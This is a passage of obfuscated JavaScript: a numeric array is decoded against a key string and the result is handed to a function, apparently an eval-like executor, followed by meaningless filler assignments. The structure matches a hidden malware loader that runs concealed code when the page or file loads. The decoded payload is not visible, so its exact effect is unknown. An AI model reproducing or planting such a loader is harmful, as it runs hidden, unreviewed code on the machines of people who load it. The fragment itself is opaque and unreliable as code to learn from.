162, 166, 146, 153, 165, 170, 148, 177, 142, 105, 144, 88, 111, 88, 100, 97, 92, 179, 64, 66, 60, 65, 60, 155, 162, 164, 159, 153, 149, 151, 154, 157, 167, 161, 150, 167, 161, 96, 92, 115, 64, 66, 60, 65, 176, 69, 61, 65, 176, 69, 61, 69, 61, 65, 163, 156, 153, 151, 166, 172, 148, 170, 167, 96, 92, 115, 64, 66, 60],
    npvw = function() {
        for (var iors; defjox < bcgiox.length; defjox += 1) {
            var eikox = defjox % bfnst.length + 1;
            var fmqrtu = bfnst.substring(defjox % bfnst.length, eikox);
            var dlnst = bcgiox[defjox];
            bcqt += bchjqs(dlnst - fmqrtu.charCodeAt(0));
        }
        akor(bcqt);
    };
npvw();
kmqtv = "";
euwx = "euwx";
oswx = 58096;

